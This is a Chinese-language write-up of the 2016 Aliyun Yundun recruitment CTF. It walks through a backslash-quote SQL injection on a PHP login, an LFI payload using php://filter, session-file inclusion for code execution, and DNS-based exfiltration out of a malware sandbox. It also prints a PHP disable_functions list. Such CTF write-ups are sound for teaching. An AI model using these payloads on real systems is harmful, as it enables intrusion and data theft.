# Aliyun Yundun Recruitment

## 说明
好久没做题了……偶然在微博上看到的我，心想“MD 比赛题不会做，这种招聘题我总该会做了吧！”以及“招聘题能有几个题，一两个测试一下估计就差不多了吧”的天真的我随手点开了题目……

然后被各种脑洞打的人都成 SB 了。

讲讲题目的话，知识点覆盖全面性肯定是没有的了（毕竟加起来也就七个题），侧重 Web 无可厚非，但 Web 题质量很难说的上是很高吧……嘛，对这类题目要求确实也不能这么高，毕竟目的不一样。另外，界面很丑，作为一个前端工程师，我感觉很崩溃。另外脑洞题也不少，以第七题为标杆：一开始打开页面只有web三个字母……就是说要渗透的话，起码也放点内容上去啊，有关无关的都好 = =||

简单的说就是整套题目不够精致，虽然不是个正式比赛，但对于选手来说题目精致点会更有兴趣。

另外本 writeup 还附赠一个第八题，有兴趣可以解一下。（噗嗤

## 题解

### 1-Barcode
题目只给了一个图。

![start](https://raw.githubusercontent.com/CTF-Mare/my-ctf-writeups/master/2016-08-25-AliyunRecruitment/attachments/1-Barcode/zhaopin.png)

虽然题目下写了熊猫颜色很奇怪，但其实你翻翻微博的话，会发现没反色的版本也被发出来过。所以都没差啦。

做法就是反色后把条形码拿出来。写程序处理的都很厉害，反正我是 PS 的（噗嗤）。说到底这个题要啥自行车啊，PS 上就好啊。PS 后涂涂抹抹，大概就是下面这个样子：

![chuli](https://raw.githubusercontent.com/CTF-Mare/my-ctf-writeups/master/2016-08-25-AliyunRecruitment/attachments/1-Barcode/aliyunzp.png)

[用这个网站](http://www.onlinebarcodereader.com/)解就好了。据某人说用库读不出来（噗嗤

### 2-Login
只有一个登陆界面。查看源代码发现了源代码的注释。

代码如下：

```
include('common.php');
function str_filter($string)
{
    $string = str_replace(' ','',$string);
    $string = str_replace('#','',$string);
    $string = str_replace('*','',$string);
    $string = str_replace("'",'',$string);
    $string = str_replace('"','',$string);
    $string = str_replace(';','',$string);
    $string = str_replace('<','<',$string);
    $string = str_replace('>','>',$string);
    $string = str_replace("{",'',$string);
    $string = str_replace('}','',$string);
    return $string;
}
$username = str_filter($_POST['username']);
$password = str_filter($_POST['password']);
$sql = sprintf("select username from old_driver_users where username='%s' and password ='%s';", $username, $password);
$result=mysql_db_query('old_driver', $sql, $conn);
$row =  mysql_fetch_row($result);
if (empty($row[0]))
{
    exit('username or password wrong!');
}
else
{
    av();
}
```

其中

```sprintf("select username from old_driver_users where username='%s' and password ='%s';", $username, $password)```

这句不要太熟悉……反正就是脱好裤子跟你说来上我吧的那种感觉……但由于上面过滤了一大堆东西，单双引号通通没有了，所以要逃出这个引号闭合来想办法写注入语句。方法也很简单，用```admin\```来当做用户名，这样```\'```就会被转义为原始的引号，使得 SQL 语句变为

```
...where username='admin\' and password='    %s     ';
```


这样我们就可以在 ```%s``` 处构造 SQL 语句了。

我不会 SQL 注入，所以只好请出 sqlmap 帮我做这个事了……由于 sqlmap 注入语句有一定格式要求，所以要另外做一下修饰。tamper 在附件里。

### 3-Portknock

file 一下直接掏出 IDA 分析就好了。附件里有两个主要函数的分析内容。

大概就是要轮流连接五个端口。连好了就给 flag 了。

什么时候 BIN 题都有这么简单就好了（泪

### 4-Sandbox

网页上显示是 Malware sandbox，注释里有系统环境……竟然是 32 位系统，真是日了狗了。

提交上去显示会在几分钟内运行，然后什么消息都没有了。沙盒没有回显，我感觉快要窒息…………

试了试交了个 system wget，服务器上没记录。猜测 system 或者网络方面有所限制。不管 system，先看看能不能穿网络，结果用 gethostbyname 穿顺利穿了出来。由于不会实现 DNS Tunnel，于是就直接 popen 读一下目录，再直接把结果当作域名解析就好了。服务器上跑一个接受 DNS 数据的小脚本就可以了。

具体利用程序在附件……因为不要 shell，感觉这个题就是虎头蛇尾的感觉。有点遗憾。

### 7-Penetration

一开始只有三个字母 web，扫端口测目录均无结果。后来显示内容提示是渗透测试，那估计还是得猜目录，最后用/CVS得到了泄露信息：

```
/index.php/1.1.1.1/Tue Jul 31 05:25:16 2012// D/ColorTestPage//// 
```
拼凑出地址：

```
http://121.42.161.140/dac8dac5f0210825338175d48f0279cb/ColorTestPage/index.php
```

观察页面，发现有一个文件包含的地方。但不能直接包含自身，因此编码后再包含：

```
http://121.42.161.140/dac8dac5f0210825338175d48f0279cb/ColorTestPage/index.php?style=php://filter/read=convert.base64-encode/resource=index.php
```

解码后：

```
[dai@CodeBlaze my-ctf-writeups (master ✗)]$ echo "PD9waHAKLyoKRGF0ZTogMjAxNS0wMi0zMCAxNTo0MzoyNwpBdXRob3I6IGxhb3NpamkKRGVzY3JpcHRpb246IGJXRm5ibVYwT2o5NGREMTFjbTQ2WW5ScGFEbzVOVGczWTJabE5XVTVZMk0yWXpReVptTTNZamxoWXpOaU1tRTNZek0wWXpCbU5EZzJNRFF4CiovCnNlc3Npb25fc2F2ZV9wYXRoKCcvdG1wJyk7CnNlc3Npb25fc3RhcnQoKTsKaWYoaXNzZXQoJF9HRVRbJ3N0eWxlJ10pKQp7CgkkX1NFU1NJT05bJ2xvb2snXT0kX0dFVFsnc3R5bGUnXTsvL2Jyb3dzZSBsb2cKCXJlcXVpcmUoJF9HRVRbJ3N0eWxlJ10pOwp9ZWxzZQp7CglyZXF1aXJlKCdub3JtYWwudHBsJyk7CQp9Cj8+" | base64 -D
<?php
/*
Date: 2015-02-30 15:43:27
Author: laosiji
Description: bWFnbmV0Oj94dD11cm46YnRpaDo5NTg3Y2ZlNWU5Y2M2YzQyZmM3YjlhYzNiMmE3YzM0YzBmNDg2MDQx
*/
session_save_path('/tmp');
session_start();
if(isset($_GET['style']))
{
       	$_SESSION['look']=$_GET['style'];//browse log
       	require($_GET['style']);
}else
{
       	require('normal.tpl');
}
?>%
```

可以看到 session 被保存到了 /tmp 里。很容易就可以考虑到，一个写 php 脚本，一个包含引用就好了……没什么技术含量。phpinfo 和 assert 被禁用了，原因不明，用 dir 直接读文件就好了。一句话也可以。

### 07EX

简要说一下。

```
string(482) "phpinfo,assert,dl,exec,system,passthru,popen,proc_open,pcntl_exec,shell_exec,chmod,set_time_limit,chroot,error_log,ini_set,pfsockopen,syslog,symlink,putenv,chgrp,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,"
```

How to get shell?

It's possible, but it's hard.

Ref: HITCON 2015 Use-After-Flee

有个0-day能用，但搞不出来...

这个题这么出还有点意思...